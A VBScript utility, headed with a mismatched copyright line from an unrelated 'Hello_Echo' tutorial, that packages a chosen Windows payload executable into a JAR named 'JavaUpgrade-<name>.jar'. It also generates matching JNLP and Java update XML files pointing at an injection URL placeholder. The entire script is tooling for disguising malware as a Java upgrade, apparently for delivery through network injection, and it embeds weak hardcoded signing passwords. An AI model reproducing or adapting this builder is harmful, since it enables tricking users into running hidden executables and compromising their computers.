'  Hello_Echo.vbs
'  Copyright (c) 2008 by Dr. Herong Yang, http://www.herongyang.com/

Const ForReading = 1

Set oArgs = WScript.Arguments
If oArgs.Length < 3 Then 
	WScript.Echo "No arguments provided!"
	WScript.Echo "Usage: makeapplet <payload> <tempdir> <outputname>"
	WScript.Quit 1
End If

Payload = WScript.Arguments.Item(0)
TmpDir = WScript.Arguments.Item(1)
OutputName = WScript.Arguments.Item(2)

WScript.Echo "Selected payload          : " & Payload
WScript.Echo "Using temporary directory : " & TmpDir
WScript.Echo "Output name               : JavaUpgrade-" & OutputName & ".jar"

KeyStore = "applet.keystore"
KeyStorePassword = "password"
KeyAlias = "AppletCert"
KeyPassword = "password"

WScript.Echo

' Check that temporary directory exists
Set objFSO = CreateObject("Scripting.FileSystemObject")
If not objFSO.FolderExists (TmpDir) then
	WScript.Echo "Cannot find temporary directory " & TmpDir
	WScript.Quit 1
End If

' switch current directory to temporary
Set tmpFolder = objFSO.GetFolder(TmpDir)
' switch current directory to temporary
Set WshShell = CreateObject("WScript.Shell")
WshShell.CurrentDirectory = TmpDir

UpgradeApplet = "JavaUpgrade-" & OutputName & ".jar"
PayloadWin = OutputName & ".exe"
JarFile =  "WebEnhancer.jar"

' delete any signed applet with the same name, if exists
If objFSO.FileExists(UpgradeApplet) then
	objFSO.DeleteFile(UpgradeApplet)
End If

objFSO.CopyFile JarFile, UpgradeApplet

If not objFSO.FileExists(UpgradeApplet) then
	WScript.Echo "Cannot find the base JAR file " & UpgradeApplet
	WScript.Quit 1
End If

If not objFSO.FileExists(PayloadWin) then
	WScript.Echo "Cannot find Windows payload file " & PayloadWin
	WScript.Quit 1
End If

objFSO.CopyFile PayloadWin, "win"

WScript.Echo "Adding payload to jar file."

WScript.Echo "Embedding Windows payload."
Ret = WshShell.Run("zip -u " & UpgradeApplet & " win", 0, true)

' Create java-map-update-#output#.xml
JavaMapUpdateSource = "java-map-update.xml"
JavaMapUpdate = "java-map-update-" & OutputName & ".xml"
WScript.Echo "Creating " & JavaMapUpdate
' Replace references to java-1.6.0_30.xml
Set objFile = objFSO.OpenTextFile(JavaMapUpdateSource, ForReading)
contents = objFile.ReadAll
objFile.close
strNewText = Replace(contents, "<url>%IPA_URL%/java-1.6.0_30.xml</url>", "<url>%IPA_URL%/java-1.6.0_30-" & OutputName & ".xml</url>")
Set objFile = objFSO.CreateTextFile(JavaMapUpdate)
objFile.WriteLine strNewText
objFile.Close

' Create java-map-update-#output#.xml
JavaVersionSource = "java-1.6.0_30.xml"
JavaVersion = "java-1.6.0_30-" & OutputName & ".xml"
WScript.Echo "Creating " & JavaVersion
' Replace references to JavaUpgrade.jnlp
Set objFile = objFSO.OpenTextFile(JavaVersionSource, ForReading)
contents = objFile.ReadAll
objFile.close
strNewText = Replace(contents, "%IPA_URL%/JavaUpgrade.jnlp ""-X</options>", "%IPA_URL%/JavaUpgrade-" & OutputName & ".jnlp ""-X</options>")
Set objFile = objFSO.CreateTextFile(JavaVersion)
objFile.WriteLine strNewText
objFile.Close

' Create JavaUpgrade-#output#.jnlp
JnlpSource = "JavaUpgrade.jnlp"
Jnlp = "JavaUpgrade-" & OutputName & ".jnlp"
WScript.Echo "Creating " & Jnlp
' Replace references to JavaUpgrade.jnlp and JavaUpgrade.jar
Set objFile = objFSO.OpenTextFile(JnlpSource, ForReading)
contents = objFile.ReadAll
objFile.close
strNewText = Replace(contents, "JavaUpgrade.jnlp", "JavaUpgrade-" & OutputName & ".jnlp")
strNewText = Replace(strNewText, "JavaUpgrade.jar", "JavaUpgrade-" & OutputName & ".jar")
Set objFile = objFSO.CreateTextFile(Jnlp)
objFile.WriteLine strNewText
objFile.Close

WScript.Echo
WScript.Echo "Done."

